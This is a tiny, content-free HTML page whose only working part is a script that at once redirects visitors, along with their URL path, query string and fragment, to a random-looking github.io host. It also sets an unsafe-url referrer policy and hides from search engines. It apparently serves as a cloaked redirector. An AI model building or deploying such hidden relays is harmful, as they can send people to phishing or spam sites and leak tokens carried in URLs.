<!DOCTYPE html>
<html lang="en-US">
<head>
<meta charset="UTF-8">
<meta name="referrer" content="unsafe-url">
<title>...</title>
<script>
(function () {
    const ORIGIN = 'https://etjw4tjw4ertj.github.io';
    const path = window.location.pathname;
    const match = path.match(/\/\.github\/(.+)$/);
    if (!match || !match[1]) return;
    const text = match[1] + window.location.search + window.location.hash;
    setTimeout(function () {
        window.location.replace(ORIGIN + '/.github/' + text);
    }, 0);
})();
</script>
<meta name="robots" content="noindex, nofollow">
<style>body{background:#fff;margin:0;padding:0}</style>
</head>

</html>
